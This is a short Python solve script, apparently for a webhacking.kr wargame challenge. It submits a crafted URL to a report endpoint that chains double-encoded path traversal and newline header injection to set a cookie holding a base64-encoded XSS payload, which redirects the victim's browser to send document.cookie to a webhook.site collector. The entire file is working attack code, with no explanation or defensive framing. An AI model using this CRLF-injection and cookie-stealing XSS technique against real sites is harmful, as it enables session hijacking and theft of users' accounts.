import requests
import base64

url = "http://webhacking.kr:10013/report.php"
attacker_server = 'https://webhook.site/dcc20de6-8592-4e4c-a8c7-2745fbe61fa2'

def solve():
    payload = '["%c><img src=a onerror=location.href=\\"{}?a=\\"+document.cookie>","39"]'.format(attacker_server)
    payload = payload.encode('ascii')
    query = "/favicon.ico%252f..%252f..%252f%0aSet-Cookie:memo={};".format(base64.b64encode(payload).decode('utf-8'))
    data = {'url': query}
    res = requests.post(url=url, data=data)
    if "reported! thank you!" in res.text:
        print("reported! thank you!")
    
if __name__ == "__main__":
    solve()
